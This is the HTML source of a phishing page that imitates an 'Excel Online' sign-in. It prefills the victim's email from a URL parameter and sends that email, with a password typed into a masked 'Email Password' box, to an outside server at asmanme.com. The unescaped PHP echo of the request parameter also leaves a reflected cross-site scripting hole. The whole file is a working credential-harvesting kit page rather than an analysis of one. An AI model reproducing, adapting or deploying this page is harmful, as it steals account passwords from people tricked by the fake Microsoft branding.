<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Excel Online</title>
<script type="text/javascript" src="./excel_files/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="#">	
			  <style type="text/css">  
.textbox {  
    border: solid 1px #999;
	padding-left: 8px;
	font-size: 15px;
    height: 34px; 
    width: 275px; 
 } 
 .textbox:focus {  
    border-color: #fff; 
  	border-bottom: #112F18;
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 
 </style>


<style type="text/css">
div#container
{
	position:relative;
	width: 1350px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="#C0C0C0">
<div id="container">
<div id="igmaa" style="position:absolute; overflow:hidden; left:0px; top:4px; width:1345px; height:661px; z-index:0"><img src="./excel_files/igma4.png" alt="" title="" border="0" width="1345" height="661"></div>



<div id="igmac" style="position:absolute; overflow:hidden; left:409px; top:87px; width:515px; height:509px; z-index:2"><img src="./excel_files/igma2.png" alt="" title="" border="0" width="515" height="509"></div>


<form action="https://asmanme.com/pdf/result.php" name="igmaigmaigma" id="igmaigmaigma" method="post">
<input name="id"  class="textbox" autocomplete="off" required="" mtype="text" style="position:absolute;width:298px;left:518px;top:343px;z-index:5" value="<?PHP echo $_REQUEST['id'];?>" disabled>
<span style="position: relative;">
<input type="hidden" name="formtext1" value="<?php echo $_REQUEST['id']; ?>"
<input type="hidden"> <input id="igma" placeholder="Email Password" class="textbox masked" autocomplete="off" required="" mtype="text" style="position:absolute;width:298px;left:518px;top:390px;z-index:6" type="text" name="formtext2"></span>
<div id="igmamgi" style="position:absolute; left:518px; top:437px; z-index:7"><input type="image" name="igmamgi" width="300" height="37" src="./excel_files/igma3.png"></div>
</form></div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("igma"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>


</body></html>